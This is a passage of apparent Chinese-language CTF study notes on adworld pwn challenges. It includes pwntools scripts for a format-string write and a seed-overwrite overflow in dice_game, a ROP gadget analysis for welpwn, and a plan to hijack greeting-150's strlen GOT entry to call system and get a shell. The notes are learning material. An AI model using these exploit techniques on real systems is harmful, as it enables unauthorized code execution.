</span></span><span class=line><span class=cl><span class=cp>#gdb.attach(io,&#34;b *0x0804849B&#34;)
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=n>buf</span> <span class=o>=</span> <span class=nf>p32</span><span class=p>(</span><span class=n>key_addr</span><span class=p>)</span><span class=o>+</span><span class=n>b</span><span class=s>&#34;%035795742d&#34;</span><span class=o>+</span><span class=n>b</span><span class=s>&#34;%12$n&#34;</span>
</span></span><span class=line><span class=cl><span class=cp>#buf=p32(key_addr)+b&#39;%12$p&#39;
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=n>io</span><span class=p>.</span><span class=nf>sendline</span><span class=p>(</span><span class=n>buf</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=p>.</span><span class=nf>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=cp>#####################################
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=n>from</span> <span class=n>pwn</span> <span class=n>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>=</span><span class=nf>process</span><span class=p>(</span><span class=s>&#34;./datamo&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>key_addr</span><span class=o>=</span><span class=mh>0x0804A048</span>
</span></span><span class=line><span class=cl><span class=n>value</span><span class=o>=</span><span class=mh>0x02223322</span>
</span></span><span class=line><span class=cl><span class=n>offset</span><span class=o>=</span><span class=mi>12</span>
</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>=</span><span class=nf>fmtstr_payload</span><span class=p>(</span><span class=n>offset</span><span class=p>,{</span><span class=nl>key_addr</span><span class=p>:</span><span class=n>value</span><span class=p>})</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=p>.</span><span class=nf>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=p>.</span><span class=nf>interactive</span><span class=p>()</span>
</span></span></code></pre></div><h1 id=dice_game>dice_game</h1><p>程序的流程是：连续50次猜中随机数，在其中没有发现可利用函数，看答案</p><p>不知道为什么第一次并没有看到栈中buf和sand数值</p><p><img src=https://s3-us-west-2.amazonaws.com/secure.notion-static.com/77e5d7e0-52fd-420f-86fe-a942ef6b7b15/Untitled.png alt=Untitled></p><p>学会看IDA自动生成的注释，在这里buf是[ESP+0h],而是seed在[ESP+40h]处，<del>相差40个字节相差</del>，相差0x40字节，这样我们就看看一利用buf覆盖掉seed</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>from</span> <span class=n>pwn</span> <span class=n>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>from</span> <span class=n>ctypes</span> <span class=n>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>.</span><span class=n>log_level</span><span class=o>=</span><span class=err>&#39;</span><span class=n>debug</span><span class=err>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>=</span><span class=nf>process</span><span class=p>(</span><span class=err>&#39;</span><span class=n>dice_game</span><span class=err>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>=</span><span class=nf>remote</span><span class=p>(</span><span class=err>&#39;</span><span class=sc>&#39;,&#39;</span><span class=err>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>=</span><span class=n>b</span><span class=sc>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x40</span><span class=o>+</span><span class=n>b</span><span class=sc>&#39;A&#39;</span><span class=o>*</span><span class=mi>4</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=p>.</span><span class=nf>recvuntil</span><span class=p>(</span><span class=err>&#39;</span><span class=n>Welcome</span><span class=p>,</span> <span class=n>let</span> <span class=n>me</span> <span class=n>know</span> <span class=n>your</span> <span class=nl>name</span><span class=p>:</span><span class=err>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=p>.</span><span class=nf>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>libc</span><span class=o>=</span><span class=n>cdll</span><span class=p>.</span><span class=nf>LoadLibrary</span><span class=p>(</span><span class=err>&#39;</span><span class=n>libc</span><span class=p>.</span><span class=n>so</span><span class=mf>.6</span><span class=err>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span><span class=p>.</span><span class=nf>srand</span><span class=p>(</span><span class=mh>0x41414141</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=n>in</span> <span class=nf>range</span><span class=p>(</span><span class=mi>50</span><span class=p>)</span><span class=o>:</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=p>.</span><span class=nf>recvuntil</span><span class=p>(</span><span class=err>&#39;</span><span class=n>Give</span> <span class=n>me</span> <span class=n>the</span> <span class=nf>point</span><span class=p>(</span><span class=mi>1</span><span class=o>~</span><span class=mi>6</span><span class=p>)</span><span class=o>:</span><span class=err>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>num</span><span class=o>=</span><span class=p>(</span><span class=n>libc</span><span class=p>.</span><span class=nf>rand</span><span class=p>()</span><span class=o>%</span><span class=mi>6</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=p>.</span><span class=nf>sendline</span><span class=p>(</span><span class=nf>str</span><span class=p>(</span><span class=n>num</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=p>.</span><span class=nf>interactive</span><span class=p>()</span>
</span></span></code></pre></div><p>PS：H表示16进制</p><h1 id=未果stack2>未果Stack2</h1><p>感觉环境有问题</p><h1 id=未果recho>未果Recho</h1><p>修改GOT表</p><h1 id=welpwn>welpwn</h1><p>此题看答案之后苦思良久，豁然开朗，对于函数调用过程中的寄存器变化还是不太熟悉</p><p>main函数</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=kr>__cdecl</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>envp</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>buf</span><span class=p>;</span> <span class=c1>// [sp+0h] [bp-400h]@1
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=nf>write</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=s>&#34;Welcome to RCTF</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=mh>0x10uLL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>fflush</span><span class=p>(</span><span class=n>_bss_start</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>buf</span><span class=p>,</span> <span class=mh>0x400uLL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>echo</span><span class=p>((</span><span class=kr>__int64</span><span class=p>)</span><span class=o>&amp;</span><span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>buf最多可接收0x400字节数据</p><p>echo函数</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=kr>__fastcall</span> <span class=nf>echo</span><span class=p>(</span><span class=kr>__int64</span> <span class=n>a1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>s2</span><span class=p>[</span><span class=mi>16</span><span class=p>];</span> <span class=c1>// [sp+10h] [bp-10h]@2
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=o>*</span><span class=p>(</span><span class=n>_BYTE</span> <span class=o>*</span><span class=p>)(</span><span class=n>i</span> <span class=o>+</span> <span class=n>a1</span><span class=p>);</span> <span class=o>++</span><span class=n>i</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>s2</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=n>_BYTE</span> <span class=o>*</span><span class=p>)(</span><span class=n>i</span> <span class=o>+</span> <span class=n>a1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>s2</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=nf>strcmp</span><span class=p>(</span><span class=s>&#34;ROIS&#34;</span><span class=p>,</span> <span class=n>s2</span><span class=p>)</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;RCTF{Welcome}&#34;</span><span class=p>,</span> <span class=n>s2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34; is not flag&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;%s&#34;</span><span class=p>,</span> <span class=n>s2</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>这里s2是个char型数组，最多存储16个字符数据，然而后面并没有对赋值的参数的个数进行限制，所以在这里可以进行溢出，而在for循环的可知一旦遇到\x00字符就会停止赋值，这时我们需要想象一下栈中的数据布局来构造payload</p><p><img src=https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e38cb0bd-1a68-420d-a68f-cbefe6b8db7c/Untitled.png alt=Untitled></p><p>首先必须明确几点：</p><ul><li>普通数据类似于A这种代码为0x41不含\x00的不会触发停止赋值，像函数地址类似pop_rdi这种必定含有0x00xxxx的一定会触发停止赋值的操作</li><li>Echo函数栈的值都是从buf数据区赋值而来，所以与buf数据区32字节数据相等</li></ul><p>这时若是类似pop_rdi这种指令，RIP跳入AAAAAAAA就会触发错误，所以在这里就需要一个跳过32字节的命令，好使我们的RIP可以直接从buf区中有效指令开始运行</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>896</span> <span class=nl>loc_400896</span><span class=p>:</span>                             <span class=p>;</span> <span class=n>CODE</span> <span class=nl>XREF</span><span class=p>:</span> <span class=n>__libc_csu_init</span><span class=o>+</span><span class=mi>36</span><span class=n>j</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>896</span>                 <span class=n>add</span>     <span class=n>rsp</span><span class=p>,</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>89</span><span class=n>A</span>                 <span class=n>pop</span>     <span class=n>rbx</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>89</span><span class=n>B</span>                 <span class=n>pop</span>     <span class=n>rbp</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>89</span><span class=n>C</span>                 <span class=n>pop</span>     <span class=n>r12</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>89</span><span class=n>E</span>                 <span class=n>pop</span>     <span class=n>r13</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>8</span><span class=n>A0</span>                 <span class=n>pop</span>     <span class=n>r14</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>8</span><span class=n>A2</span>                 <span class=n>pop</span>     <span class=n>r15</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>8</span><span class=n>A4</span>                 <span class=n>retn</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>8</span><span class=n>A4</span> <span class=n>__libc_csu_init</span> <span class=n>endp</span>
</span></span></code></pre></div><p>所需的pop_32个字节的指令0x000000000040089C</p><p>然后利用DynELF进行求解</p><h1 id=未果greeting-150>未果greeting-150</h1><p>每篇WP要看好几天也不知道咋办</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=kr>__cdecl</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>envp</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>result</span><span class=p>;</span> <span class=c1>// eax@2
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v4</span><span class=p>;</span> <span class=c1>// edx@4
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v5</span><span class=p>;</span> <span class=c1>// [sp+1Ch] [bp-84h]@2
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v6</span><span class=p>;</span> <span class=c1>// [sp+5Ch] [bp-44h]@1
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v7</span><span class=p>;</span> <span class=c1>// [sp+9Ch] [bp-4h]@1
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>v7</span> <span class=o>=</span> <span class=o>*</span><span class=nf>MK_FP</span><span class=p>(</span><span class=n>__GS__</span><span class=p>,</span> <span class=mi>20</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Please tell me your name... &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=nf>getnline</span><span class=p>((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>v6</span><span class=p>,</span> <span class=mi>64</span><span class=p>)</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>sprintf</span><span class=p>((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>v5</span><span class=p>,</span> <span class=s>&#34;Nice to meet you, %s :)</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>v6</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=nf>printf</span><span class=p>((</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>v5</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Don&#39;t ignore me ;( &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=n>v4</span> <span class=o>=</span> <span class=o>*</span><span class=nf>MK_FP</span><span class=p>(</span><span class=n>__GS__</span><span class=p>,</span> <span class=mi>20</span><span class=p>)</span> <span class=o>^</span> <span class=n>v7</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>在14行处存在一个格式化字符串漏洞</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>size_t</span> <span class=kr>__cdecl</span> <span class=nf>getnline</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=n>s</span><span class=p>,</span> <span class=kt>int</span> <span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=o>*</span><span class=n>v3</span><span class=p>;</span> <span class=c1>// [sp+1Ch] [bp-Ch]@1
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=nf>fgets</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=n>n</span><span class=p>,</span> <span class=n>stdin</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>v3</span> <span class=o>=</span> <span class=nf>strchr</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=mi>10</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>v3</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=n>v3</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nf>strlen</span><span class=p>(</span><span class=n>s</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>暂定思路getnline中的s是我们可控的，我们劫持strlen的GOT表，将其修改成system，然后传入/bin/sh,问题是：代码不在一个循环中，我们劫持完之后，代码后续直接return结束了，无法再传入/bin/sh，因此我们要让他结束之后重新运行一遍main</p><blockquote><p>在main函数前会调用.init段代码和.init_array段的函数数组中每一个函数指针。同样的，main
函数结束后也会调用.fini段代码和.fini._arrary段的函数数组中的每一个函数指针</p></blockquote><blockquote><p>分析了__libc_csu_fini函数的执行流程，简单来说就是执行fini_array数组的内容，先执行fini_array[1]接着执行fini_array[0]</p></blockquote><p>修改.fini_array段中的指针地址，让他不会直接结束</p><p>查看一下printf的输出偏移</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>vincebye</span><span class=err>@</span><span class=nl>ubuntu</span><span class=p>:</span><span class=o>~/</span><span class=n>ctf</span><span class=o>/</span><span class=n>adworld1</span><span class=o>/</span><span class=n>greeting150</span><span class=err>$</span> <span class=n>greeting150</span> 
</span></span><span class=line><span class=cl><span class=n>Hello</span><span class=p>,</span> <span class=n>I</span><span class=err>&#39;</span><span class=n>m</span> <span class=n>nao</span><span class=o>!</span>
</span></span><span class=line><span class=cl><span class=n>Please</span> <span class=n>tell</span> <span class=n>me</span> <span class=n>your</span> <span class=n>name</span><span class=p>...</span> <span class=n>AABBBBCCCC</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span>
</span></span><span class=line><span class=cl><span class=n>Nice</span> <span class=n>to</span> <span class=n>meet</span> <span class=n>you</span><span class=p>,</span> <span class=n>AABBBBCCCC</span><span class=o>-</span><span class=mh>0x80487d0</span><span class=o>-</span><span class=mh>0xff959e0c</span><span class=o>-</span><span class=p>(</span><span class=n>nil</span><span class=p>)</span><span class=o>-</span><span class=p>(</span><span class=n>nil</span><span class=p>)</span><span class=o>-</span><span class=p>(</span><span class=n>nil</span><span class=p>)</span><span class=o>-</span><span class=p>(</span><span class=n>nil</span><span class=p>)</span><span class=o>-</span><span class=mh>0x6563694e</span><span class=o>-</span><span class=mh>0x206f7420</span><span class=o>-</span><span class=mh>0x7465656d</span><span class=o>-</span><span class=mh>0x756f7920</span><span class=o>-</span><span class=mh>0x4141202c</span><span class=o>-</span><span class=mh>0x42424242</span><span class=o>-</span><span class=mh>0x43434343</span><span class=o>-</span><span class=mh>0x2d70252d</span><span class=o>-</span><span class=mh>0x252d7025</span><span class=o>-</span><span class=mh>0x70252d70</span><span class=o>-</span><span class=mh>0x2d70252d</span><span class=o>-%</span> <span class=o>:</span><span class=p>)</span>
</span></span></code></pre></div><p>因为Nice to meet you,占用18字节大小，所以我们加了个AA补位，让他对齐，后续的输入是从第12个参数开始的</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>System</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nl>GOT</span><span class=p>:</span><span class=k>extern</span><span class=o>:</span><span class=mi>08049</span><span class=n>AE4</span> <span class=p>;</span> <span class=kt>int</span> <span class=nf>system</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>command</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nl>PLT</span><span class=p>:</span><span class=nl>tomori</span><span class=p>:</span><span class=mi>08048779</span> <span class=n>call</span> <span class=n>_system</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>_start</span> <span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mf>080484F</span><span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>extern</span><span class=o>:</span><span class=mi>08049</span><span class=n>AEC</span> <span class=p>;</span> <span class=kt>size_t</span> <span class=nf>strlen</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>s</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>fini_array</span><span class=p>:</span><span class=mi>08049934</span> <span class=n>_fini_array</span>     <span class=n>segment</span> <span class=n>dword</span> <span class=n>public</span> <span class=err>&#39;</span><span class=n>DATA</span><span class=err>&#39;</span> <span class=n>use32</span>
</span></span></code></pre></div><ul><li>劫持strlen函数的GOT表为system</li><li>修改fini_array第一个元素为start函数，实现循环</li><li>第二次循环的时候输入/bin/sh，拿到shell</li></ul><h1 id=未果pwn-200>未果pwn-200</h1><p>0804A058 write</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>ssize_t</span> <span class=nf>sub_8048484</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>buf</span><span class=p>;</span> <span class=c1>// [sp+1Ch] [bp-6Ch]@1
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=nf>setbuf</span><span class=p>(</span><span class=n>stdin</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>buf</span><span class=p>,</span> <span class=mh>0x100u</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>感觉思路就是利用的DynELF</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>vincebye</span><span class=err>@</span><span class=nl>ubuntu</span><span class=p>:</span><span class=o>~/</span><span class=n>ctf</span><span class=o>/</span><span class=n>adworld1</span><span class=o>/</span><span class=n>pwn200</span><span class=err>$</span> <span class=n>readelf</span> <span class=o>-</span><span class=n>S</span> <span class=n>pwn200</span> 
</span></span><span class=line><span class=cl><span class=n>There</span> <span class=n>are</span> <span class=mi>28</span> <span class=n>section</span> <span class=n>headers</span><span class=p>,</span> <span class=n>starting</span> <span class=n>at</span> <span class=n>offset</span> <span class=mh>0x1134</span><span class=o>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Section</span> <span class=nl>Headers</span><span class=p>:</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span><span class=n>Nr</span><span class=p>]</span> <span class=n>Name</span>              <span class=n>Type</span>            <span class=n>Addr</span>     <span class=n>Off</span>    <span class=n>Size</span>   <span class=n>ES</span> <span class=n>Flg</span> <span class=n>Lk</span> <span class=n>Inf</span> <span class=n>Al</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span> <span class=mi>0</span><span class=p>]</span>                   <span class=nb>NULL</span>            <span class=mo>00000000</span> <span class=mo>000000</span> <span class=mo>000000</span> <span class=mo>00</span>      <span class=mi>0</span>   <span class=mi>0</span>  <span class=mi>0</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span> <span class=mi>1</span><span class=p>]</span> <span class=p>.</span><span class=n>interp</span>           <span class=n>PROGBITS</span>        <span class=mi>08048154</span> <span class=mo>000154</span> <span class=mo>000013</span> <span class=mo>00</span>   <span class=n>A</span>  <span class=mi>0</span>   <span class=mi>0</span>  <span class=mi>1</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span> <span class=mi>2</span><span class=p>]</span> <span class=p>.</span><span class=n>note</span><span class=p>.</span><span class=n>ABI</span><span class=o>-</span><span class=n>tag</span>     <span class=n>NOTE</span>            <span class=mi>08048168</span> <span class=mo>00016</span><span class=mi>8</span> <span class=mo>000020</span> <span class=mo>00</span>   <span class=n>A</span>  <span class=mi>0</span>   <span class=mi>0</span>  <span class=mi>4</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span> <span class=mi>3</span><span class=p>]</span> <span class=p>.</span><span class=n>note</span><span class=p>.</span><span class=n>gnu</span><span class=p>.</span><span class=n>build</span><span class=o>-</span><span class=n>i</span> <span class=n>NOTE</span>            <span class=mi>08048188</span> <span class=mo>0001</span><span class=mi>88</span> <span class=mo>000024</span> <span class=mo>00</span>   <span class=n>A</span>  <span class=mi>0</span>   <span class=mi>0</span>  <span class=mi>4</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span> <span class=mi>4</span><span class=p>]</span> <span class=p>.</span><span class=n>gnu</span><span class=p>.</span><span class=n>hash</span>         <span class=n>GNU_HASH</span>        <span class=mi>080481</span><span class=n>ac</span> <span class=mo>0001</span><span class=n>ac</span> <span class=mo>00002</span><span class=n>c</span> <span class=mo>04</span>   <span class=n>A</span>  <span class=mi>5</span>   <span class=mi>0</span>  <span class=mi>4</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span> <span class=mi>5</span><span class=p>]</span> <span class=p>.</span><span class=n>dynsym</span>           <span class=n>DYNSYM</span>          <span class=mi>080481</span><span class=n>d8</span> <span class=mo>0001</span><span class=n>d8</span> <span class=mo>0000</span><span class=mi>90</span> <span class=mi>10</span>   <span class=n>A</span>  <span class=mi>6</span>   <span class=mi>1</span>  <span class=mi>4</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span> <span class=mi>6</span><span class=p>]</span> <span class=p>.</span><span class=n>dynstr</span>           <span class=n>STRTAB</span>          <span class=mi>08048268</span> <span class=mo>00026</span><span class=mi>8</span> <span class=mo>000064</span> <span class=mo>00</span>   <span class=n>A</span>  <span class=mi>0</span>   <span class=mi>0</span>  <span class=mi>1</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span> <span class=mi>7</span><span class=p>]</span> <span class=p>.</span><span class=n>gnu</span><span class=p>.</span><span class=n>version</span>      <span class=n>VERSYM</span>          <span class=mi>080482</span><span class=n>cc</span> <span class=mo>0002</span><span class=n>cc</span> <span class=mo>000012</span> <span class=mo>02</span>   <span class=n>A</span>  <span class=mi>5</span>   <span class=mi>0</span>  <span class=mi>2</span>
